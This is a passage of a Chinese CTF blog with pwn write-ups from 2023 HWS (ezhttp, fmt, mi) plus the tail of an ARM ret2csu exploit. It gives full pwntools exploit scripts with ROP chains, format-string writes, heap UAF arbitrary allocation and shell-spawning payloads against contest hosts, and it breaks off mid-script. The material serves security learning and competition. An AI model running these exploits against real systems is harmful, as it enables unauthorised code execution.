class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">def ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,call_func_got_R5,arg0_R7,arg1_R8,arg2_R9,ret_ad):</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  pop_r4_r10_ad: csu里 POP     &#123;R4-R10,PC&#125;地址</span><br><span class="line">  mov_r2_r9_ad: csu里MOV     R2, R9地址</span><br><span class="line">  call_func_got_R5: 存有要执行函数地址的地址 一般为got</span><br><span class="line">  arg0_R7:参数<span class="number">1</span></span><br><span class="line">  arg1_R8:参数<span class="number">2</span></span><br><span class="line">  arg2_R9:参数<span class="number">3</span></span><br><span class="line">  ret_ad:执行过后返回的地址</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  R4=<span class="number">1</span></span><br><span class="line">  R6=<span class="number">2</span></span><br><span class="line">  R10=<span class="number">0xdeadbeef</span></span><br><span class="line">  payload=padding+p32(pop_r4_r10_ad)+p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(mov_r2_r9_ad)</span><br><span class="line">  payload+=p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(ret_ad)</span><br><span class="line">  ru(b<span class="string">&quot;put:&quot;</span>)</span><br><span class="line">  sl(payload)</span><br><span class="line">padding=<span class="number">12</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span></span><br><span class="line">pop_r4_r10_ad=<span class="number">0x0010500</span></span><br><span class="line">mov_r2_r9_ad=<span class="number">0x00104E0</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_ad=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,write_got,<span class="number">1</span>,write_got,<span class="number">0x10</span>,main_ad)</span><br><span class="line">ru(b<span class="number">&#x27;b</span>yebye<span class="number">&#x27;</span>)</span><br><span class="line">write_ad=uu32(r(<span class="number">4</span>))</span><br><span class="line">base=write_ad-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = base + next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line">bss=elf.bss()+<span class="number">0x100</span></span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,read_got,<span class="number">0</span>,bss,<span class="number">0x8</span>,main_ad)</span><br><span class="line">sl(p32(system_addr))</span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,bss,binsh,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xdeadbeff</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 HWS pwn</title>
      <link href="/2023/07/17/2023hws/"/>
      <url>/2023/07/17/2023hws/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1tXE2hCnld4tdbytiQtSvog">https://pan.baidu.com/s/1tXE2hCnld4tdbytiQtSvog</a><br>提取码：llaa</p><h1 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-918h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-914h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+20h] [rbp-910h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 get_data_number; <span class="comment">// [rsp+28h] [rbp-908h]</span></span><br><span class="line">  __int64 j; <span class="comment">// [rsp+28h] [rbp-908h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-900h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-900h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8F8h]</span></span><br><span class="line">  <span class="type">char</span> *k; <span class="comment">// [rsp+40h] [rbp-8F0h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+50h] [rbp-8E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">64</span>]; <span class="comment">// [rsp+E0h] [rbp-850h] BYREF</span></span><br><span class="line">  <span class="type">char</span> haystack[<span class="number">256</span>]; <span class="comment">// [rsp+120h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">char</span> request_mode[<span class="number">256</span>]; <span class="comment">// [rsp+220h] [rbp-710h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [rsp+320h] [rbp-610h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">16</span>]; <span class="comment">// [rsp+520h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">5</span>]; <span class="comment">// [rsp+530h] [rbp-400h] BYREF</span></span><br><span class="line">  _BYTE v18[<span class="number">1011</span>]; <span class="comment">// [rsp+535h] [rbp-3FBh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+928h] [rbp-8h]</span></span><br></pre></td></tr></table></figure><p>分析过后要控制 sub_5596534A9993(a1, s, request_mode, k, v4);函数里的execl(a2, 0LL);来执行bin&#x2F;sh</p><p>haystack和htdocs拼接组成a2 htdocs一般在Opt&#x2F;lampp&#x2F;htdocs下所以需要控制haystack为htdocs&#x2F;..&#x2F;..&#x2F;..&#x2F;bin&#x2F;sh，但是又过滤strstr(haystack, “..”)不能直接..&#x2F; ，get_data_number &#x3D; get_data(a1, input, 1024)那里可以溢出控制v18然后，利用sub_5596534A8766(v18, v12);再利用v12向haystack里写数值，sub_5596534A8766里四个v18处的值可以控制三个v12处的值，所以会从v12+63就需要来控制值来输出到haystack，所以第一个采用了&#x2F;&#x2F;.的方式来写为Ly8u，后面采用&#x2F;..的方式写Ly4u，然后最后用L&#x3D;&#x3D;&#x3D;只写一个&#x2F;，用等号来控制结束，最终就是htdocs&#x2F;.&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;bin&#x2F;sh,其余判断常规绕过即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_5596534A8766</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 j; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 k; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 m; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 s; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+25h] [rbp-Bh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+26h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+27h] [rbp-9h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">                                                <span class="comment">// a1可控  a2+64写</span></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(v10 + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">255</span>, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x3F</span>u; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[j] == *(v10 + a1) )</span><br><span class="line">        s = j;                                  <span class="comment">// 11 L</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">0x3F</span>u; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[k] == *(v10 + <span class="number">1LL</span> + a1) )</span><br><span class="line">        v13 = k;                                <span class="comment">// 50 y</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">0x3F</span>u; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[m] == *(v10 + <span class="number">2LL</span> + a1) )</span><br><span class="line">        v14 = m;                                <span class="comment">// 56 4</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">0x3F</span>u; ++n )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[n] == *(v10 + <span class="number">3LL</span> + a1) )</span><br><span class="line">        v15 = n;                                <span class="comment">// 46 u</span></span><br><span class="line">    &#125;</span><br><span class="line">    v2 = i++;</span><br><span class="line">    *(v2 + a2) = (v13 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span> | (<span class="number">4</span> * s);      <span class="comment">// v13=50 s=11 /</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v10 + <span class="number">2LL</span> + a1) == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = i++;</span><br><span class="line">    *(v3 + a2) = (v14 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span> | (<span class="number">16</span> * v13); <span class="comment">// v14=56 111000 .  60 /</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v10 + <span class="number">3LL</span> + a1) == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = i;</span><br><span class="line">    *(v4 + a2) = v15 &amp; <span class="number">63</span> | (v14 &lt;&lt; <span class="number">6</span>);         <span class="comment">// v15 46 .   v14最后两位必须是00</span></span><br><span class="line">    v10 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;60.204.140.184&quot;</span>,<span class="string">&quot;30230&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">get abcabcabcabc/bin/sh?.css.html</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbLy8uLy4uLy4uLy4uL===</span><br><span class="line">Authorization: Basic</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>get abcabcabcabc/bin/bash?.css.html<span class="number">&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">21</span>+b<span class="number">&#x27;b</span><span class="number">&#x27;</span>*<span class="number">84</span>+b<span class="number">&#x27;L</span>y8uLy4uLy4uLy4uL===&#x27;</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(b<span class="number">&#x27;</span>Authorization: Basic <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sleep(1)</span></span><br><span class="line"><span class="string">io.send(b&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>赛后看了wp发现sub_5596534A8766是一个base64的解密，直接构造覆写就行了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">b<span class="number">&#x27;</span>Authorization: Basic <span class="string">&#x27;+base64.b64encode(64*b&#x27;</span>a<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>/../../../../../../../../bin/sh?.html<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h1><p>常规栈上字符串格式化漏洞，泄露main函数返回地址所在的栈地址和libc基址，然后长度不够所以一次写两个字节写onegadget到返回地址即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;60.204.140.184&#x27;</span>,<span class="string">&#x27;30058&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x00136D)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x013E8  )&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%18$p%21$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;a str: &quot;</span>,payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_tar=<span class="built_in">int</span>(ru(<span class="string">b&#x27;0x&#x27;</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">p(<span class="string">&#x27;stack_tar&#x27;</span>,stack_tar)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line">p(<span class="string">&quot;__libc_start_main&quot;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=base+<span class="number">0xe3b01</span></span><br><span class="line"><span class="comment"># payload=fmtstr_payload(6,&#123;stack_tar:(ogg&amp;0xffffffffff)&#125;,write_size=&#x27;short&#x27;)</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;stack_tar:(ogg)&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">sla(<span class="string">b&quot;str: &quot;</span>,payload)</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"><span class="comment"># print(hex(ogg))</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h1><p><a href="https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/">https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-rpath <span class="string">&#x27;/home/grxer/Desktop/share/2023hws/mi&#x27;</span> ./pwn </span><br></pre></td></tr></table></figure><p>上面命令可以成功patch的原因应该是对方编译时的机器是Ubuntu20，我自己的也是u20</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;/home/grxer/Desktop/share/2023hws/mi&#x27; ./pwn </span><br><span class="line">patchelf --set-rpath &#x27;/home/grxer/Desktop/share/2023hws/mi/&#x27; ./libmimalloc.so.2</span><br><span class="line">patchelf --set-interpreter &#x27;/home/grxer/Desktop/share/2023hws/mi/ld.so&#x27;  ./pwn</span><br></pre></td></tr></table></figure><p>删除时没有将存放指针处置0，存在uaf漏洞，开启了沙箱</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">1</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1<span class="number">-8</span>))</span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">3</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;b&quot;</span>*<span class="number">1</span>) #<span class="number">4</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;c&quot;</span>*<span class="number">1</span>) #<span class="number">5</span> </span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;d&quot;</span>*<span class="number">8</span>) #<span class="number">6</span></span><br></pre></td></tr></table></figure><p>删除1和2，利用uaf再修改2的话会把原来的空闲堆块链条2–&gt;1变为2–&gt;leak1-8，后面再申请到#6时就可以拿到leak1-8这个堆块，所以我们可以利用这个来申请任意地址的堆块</p><p>有了任意申请之后就是地址泄露，可以利用简单的申请一个堆和show函数来泄露mimalloc堆块的起始地址也就是maps的最上面那一块，然后发现他起始地址偏移+0x160位置处有一个地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">     <span class="number">0x55060000000</span>      <span class="number">0x55064000000</span> rw-p  <span class="number">4000000</span>      <span class="number">0</span> [anon_55060000]</span><br><span class="line">pwndbg&gt; tel <span class="number">0x55060000000</span>+<span class="number">0x160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55060000160</span> —▸ <span class="number">0x7fe7da5a5740</span> ◂— <span class="number">0x7fe7da5a5740</span></span><br></pre></td></tr></table></figure><p>然后发现0x7fe7da5a5740偏移+0x300处有一个地址是栈上的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tel <span class="number">0x7fe7da5a5740</span>+<span class="number">0x300</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fe7da5a5a40</span> —▸ <span class="number">0x7fffa5cd7100</span> —▸ <span class="number">0x5642b1dc7950</span> ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fe7da5a5a48</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>所以我们可以利用一步步申请，show泄露地址的方法一直泄露到这个栈地址0x7fffa5cd7100（这里一直申请泄露地址-8处的堆块主要是为了防止add时输入覆盖了要泄露的地址），可以利用这个栈地址+偏移，泄露里libc基地址，然后来覆盖edit返回地址来orw，比赛时似乎有带猪脑过载，下面的payload有点犯傻的饶了圈子来orw，先改了edit返回的ebp为__libc_start_main+243返回地址-8的位置和返回地址为leave ret，然后在__libc_start_main+243处构造了orw，赛后想想其实直接改edit返回地址为orw即可，再仔细想想其实连pie都不用泄露呜呜呜</p><h3 id="比赛时猪脑过载的EXP"><a href="#比赛时猪脑过载的EXP" class="headerlink" title="比赛时猪脑过载的EXP"></a>比赛时猪脑过载的EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc_elf=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;123.60.179.52&quot;</span>,<span class="string">&quot;30304&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sa(<span class="string">b&#x27; Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span 